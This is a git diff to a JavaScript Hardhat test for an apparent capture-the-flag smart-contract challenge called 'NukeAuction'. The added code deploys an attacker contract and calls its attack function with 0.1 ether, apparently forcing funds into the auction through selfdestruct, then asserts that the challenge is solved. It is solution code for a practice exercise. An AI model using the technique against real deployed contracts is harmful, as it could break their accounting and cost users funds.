@@ -25,6 +25,24 @@ describe("NukeAuction", function () {
         // transfer the amount through a selfdestruct
         // necessary to solve the challenge:
 
+        const attackerFactory = await ethers.getContractFactory("NukeAuctionAttacker");
+        const attacker = await attackerFactory.deploy();
+        await attacker.deployed();
+
+        const tx = {
+            value: ethers.utils.parseEther("0.1"),
+            gasLimit: 100000
+        };
+
+        const attackTx = await attacker.attack(challenge.address, tx);
+        const attackReceipt = await attackTx.wait();
         
+        auctionSane = await challenge.isAuctionSane();
+        console.log("Is auction sane?", auctionSane);
+
+        const challengeSolved = await challenge.isSolved();
+        console.log("challengeSolved ?", challengeSolved);
+
+        expect(challengeSolved).to.equal(true);
     });
 });
